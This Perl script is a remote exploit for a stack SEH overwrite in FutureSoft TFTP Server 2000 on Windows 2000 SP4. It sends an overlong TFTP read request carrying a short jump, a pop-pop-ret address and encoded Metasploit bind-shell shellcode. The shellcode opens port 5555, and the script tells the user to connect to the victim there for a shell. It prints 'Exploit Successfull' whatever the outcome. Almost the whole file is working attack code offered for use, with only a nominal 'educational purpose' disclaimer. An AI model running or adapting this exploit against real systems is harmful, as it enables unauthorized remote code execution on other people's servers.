#!/usr/bin/perl
# ===============================================================================================
#                  FutureSoft TFTP Server 2000 Remote SEH Overwrite Exploit
#                               By Umesh Wanve
# ===============================================================================================
# 
# Date : 22-03-2007
#
# Tested on Windows 2000 SP4 Server English
#           Windows 2000 SP4 Professional English
#
# You can replace shellcode with your favourite one :)
#
# 
# Stack --->      buffer                       ===  AAAAA.........
#                   |
#            Pointer to next SEH               ===  Short Jump to Hellcode  
#                   |
#               SEH Handler                    ===  Pop, Pop, Ret (ws2help.dll win2000 sp4)
#                   |
#                NOP Sled                      ===  Nop Sled
#                   | 
#                Hellcode                      ===  Hell.........
# 
# This exploit will open port 5555 on remote server. Connect it to open shell.
#
#
# P.S: This was written for educational purpose. Use it at your own risk.Author will be not be 
#      responsible for any damage.
#  
# Always Thanks to Metasploit. 
#
#==================================================================================================


use IO::Socket;
#use strict;

 
my($read_request)="\x00\x01";                                                # GET or PUT request

my($tailer)="\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00";                      #transporting mode (eg. netascii)   

                        
# win32_bind -  EXITFUNC=seh LPORT=5555 Size=344 Encoder=Pex http://metasploit.com
my($shellcode)=
"\x90\x90\x90\x90".                                          #padding
"\x33\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x60".
"\x5f\x45\x77\x83\xee\xfc\xe2\xf4\x9c\x35\xae\x3a\x88\xa6\xba\x88".
"\x9f\x3f\xce\x1b\x44\x7b\xce\x32\x5c\xd4\x39\x72\x18\x5e\xaa\xfc".
"\x2f\x47\xce\x28\x40\x5e\xae\x3e\xeb\x6b\xce\x76\x8e\x6e\x85\xee".
"\xcc\xdb\x85\x03\x67\x9e\x8f\x7a\x61\x9d\xae\x83\x5b\x0b\x61\x5f".
"\x15\xba\xce\x28\x44\x5e\xae\x11\xeb\x53\x0e\xfc\x3f\x43\x44\x9c".
"\x63\x73\xce\xfe\x0c\x7b\x59\x16\xa3\x6e\x9e\x13\xeb\x1c\x75\xfc".
"\x20\x53\xce\x07\x7c\xf2\xce\x37\x68\x01\x2d\xf9\x2e\x51\xa9\x27".
"\x9f\x89\x23\x24\x06\x37\x76\x45\x08\x28\x36\x45\x3f\x0b\xba\xa7".
"\x08\x94\xa8\x8b\x5b\x0f\xba\xa1\x3f\xd6\xa0\x11\xe1\xb2\x4d\x75".
"\x35\x35\x47\x88\xb0\x37\x9c\x7e\x95\xf2\x12\x88\xb6\x0c\x16\x24".
"\x33\x0c\x06\x24\x23\x0c\xba\xa7\x06\x37\x50\xc4\x06\x0c\xcc\x96".
"\xf5\x37\xe1\x6d\x10\x98\x12\x88\xb6\x35\x55\x26\x35\xa0\x95\x1f".
"\xc4\xf2\x6b\x9e\x37\xa0\x93\x24\x35\xa0\x95\x1f\x85\x16\xc3\x3e".
"\x37\xa0\x93\x27\x34\x0b\x10\x88\xb0\xcc\x2d\x90\x19\x99\x3c\x20".
"\x9f\x89\x10\x88\xb0\x39\x2f\x13\x06\x37\x26\x1a\xe9\xba\x2f\x27".
"\x39\x76\x89\xfe\x87\x35\x01\xfe\x82\x6e\x85\x84\xca\xa1\x07\x5a".
"\x9e\x1d\x69\xe4\xed\x25\x7d\xdc\xcb\xf4\x2d\x05\x9e\xec\x53\x88".
"\x15\x1b\xba\xa1\x3b\x08\x17\x26\x31\x0e\x2f\x76\x31\x0e\x10\x26".
"\x9f\x8f\x2d\xda\xb9\x5a\x8b\x24\x9f\x89\x2f\x88\x9f\x68\xba\xa7".
"\xeb\x08\xb9\xf4\xa4\x3b\xba\xa1\x32\xa0\x95\x1f\x90\xd5\x41\x28".
"\x33\xa0\x93\x88\xb0\x5f\x45\x77".
"\x90\x90\x90\x90".                                        #padding
"\x90\x90\x90\x90";

my($pointer_to_next_seh)="\xeb\x06\x90\x90";               #short jump to shellcode

my($seh_handler)="\xa9\x11\x02\x75";                        #pop, pop, ret 
                                                            #(ws2help.dll win2000 sp4) 

#Building malicious buffer

my($buffer)=$read_request.("A" x 268).$pointer_to_next_seh.$seh_handler.$shellcode.$tailer;  


if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],

PeerPort => "69",

Proto    => "UDP"))
{
                
                 print "++Building Packet......\n"  ;
		     print "++Connecting to server.....\n";
		     print "++Sending Buffer ....\n";
	           print "++Exploit Successfull...\n";
                 print "++Connect to victim on 5555.....\n";
	
                 # request + file name  + mode
                 #see tftp protocol

                 print $socket $buffer;      
                 sleep(1);
			
                 close($socket);
}
else
{
                 print "Cannot connect to $ARGV[0]:69\n";
}
# __END_CODE 